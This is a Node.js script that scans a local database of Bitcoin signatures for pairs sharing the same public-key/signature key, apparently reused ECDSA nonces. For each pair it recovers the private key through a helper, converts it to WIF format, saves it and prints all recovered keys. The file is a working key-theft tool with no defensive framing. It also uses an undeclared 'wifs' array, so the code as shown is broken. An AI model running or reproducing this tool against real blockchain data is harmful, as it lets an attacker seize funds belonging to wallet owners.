const guessor = require("./utils/guessor");
const leveldown = require('leveldown');
const levelup = require('levelup');
const bitcoin = require("bitcoinjs-lib");
const bigi = require("bigi");
const ItrWrapper = require("./utils/lvldwnitr-wrapper");
const coins = require('./utils/coins');
const path = require("path");

const cachePath = path.join(process.cwd(), "caches");
const db = levelup(leveldown(cachePath));

process.on('SIGINT', () => {
    db.close();
    process.exit();
});

function normalFinish(a) {
    console.log(a);
    db.close();
}

const network = coins.getNetwork();

(async () => {
    const iter = new ItrWrapper(db.iterator({
        keyAsBuffer: false,
        valueAsBuffer: true
    }));
    let lastKey, lastValue;
    try {
        while (true) {
            const {
                k: key,
                v: value
            } = await iter.next();
            if (key === undefined) {
                break;
            }
            const keyCut = key.split("/");
            if (key.endsWith("/wif") && keyCut.length == 2) {
                wifs.push(value);
                continue;
            }
            if (key.endsWith("/message") || keyCut.length != 3 || key.startsWith("last")) {
                continue;
            }
            const [pubSig, txVin] = keyCut;
            if (lastKey != pubSig) {
                console.log(`Indexed: ${pubSig} ${txVin}`);
                lastKey = pubSig;
                lastValue = txVin;
            } else {
                // found!!!
                console.log(`Found: ${pubSig} ${txVin}`);
                const firstName = lastValue;
                const secondName = txVin;
                try {
                    const privateKeyD = await guessor({
                        message1Buffer: (await db.get(`${pubSig}/${firstName}/message`)),
                        message2Buffer: (await db.get(`${pubSig}/${secondName}/message`)),

                        signature1Buffer: (await db.get(`${pubSig}/${firstName}/signature`)),
                        signature2Buffer: (await db.get(`${pubSig}/${secondName}/signature`))
                    });
                    const dBigi = new bigi(privateKeyD);
                    const pair = new bitcoin.ECPair(dBigi, null, {
                        network,
                        compressed: false
                    });
                    const wif = pair.toWIF();
                    console.log(`The result WIF is: ${wif}`);
                    wifs.push(wif);
                    await db.put(`${pubSig}/wif`, wif);
                } catch (e) {
                    console.log(`Failed: ${e}`);
                }
            }
        }
    } finally {
        await iter.end();
        console.log("Found all private keys (in WIF)");
        for (let wif of wifs) {
            console.log(wif);
        }
    }
})().then(normalFinish, normalFinish);